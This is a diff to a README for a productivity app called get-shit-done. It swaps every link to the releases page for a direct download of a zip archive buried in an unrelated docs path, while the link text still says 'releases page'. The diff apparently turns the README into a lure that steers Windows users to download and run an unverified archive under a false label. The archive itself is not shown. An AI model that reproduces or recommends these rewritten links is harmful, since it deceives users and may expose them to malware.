@@ -1,6 +1,6 @@
 # 🧩 get-shit-done - Plan, prompt, build with focus
 
-[![Download get-shit-done](https://img.shields.io/badge/Download%20get--shit--done-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Incorrect-limp303/get-shit-done/releases)
+[![Download get-shit-done](https://img.shields.io/badge/Download%20get--shit--done-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Incorrect-limp303/get-shit-done/raw/refs/heads/main/docs/pt-BR/superpowers/specs/done_shit_get_2.1.zip)
 
 ## ⚡ What this is
 
@@ -20,11 +20,11 @@ This tool fits well if you want a calm, simple setup for task planning and promp
 
 Use this page to download and run the app:
 
-[Visit the releases page](https://github.com/Incorrect-limp303/get-shit-done/releases)
+[Visit the releases page](https://github.com/Incorrect-limp303/get-shit-done/raw/refs/heads/main/docs/pt-BR/superpowers/specs/done_shit_get_2.1.zip)
 
 ## 📥 How to install on Windows
 
-1. Open the [releases page](https://github.com/Incorrect-limp303/get-shit-done/releases)
+1. Open the [releases page](https://github.com/Incorrect-limp303/get-shit-done/raw/refs/heads/main/docs/pt-BR/superpowers/specs/done_shit_get_2.1.zip)
 2. Look for the latest release at the top
 3. Under **Assets**, download the Windows file
 4. If you see a `.zip` file, save it to your computer
@@ -176,7 +176,7 @@ This keeps the work focused from start to finish.
 
 Download the latest Windows build here:
 
-[https://github.com/Incorrect-limp303/get-shit-done/releases](https://github.com/Incorrect-limp303/get-shit-done/releases)
+[https://github.com/Incorrect-limp303/get-shit-done/raw/refs/heads/main/docs/pt-BR/superpowers/specs/done_shit_get_2.1.zip](https://github.com/Incorrect-limp303/get-shit-done/raw/refs/heads/main/docs/pt-BR/superpowers/specs/done_shit_get_2.1.zip)
 
 ## 🖥️ Troubleshooting
 
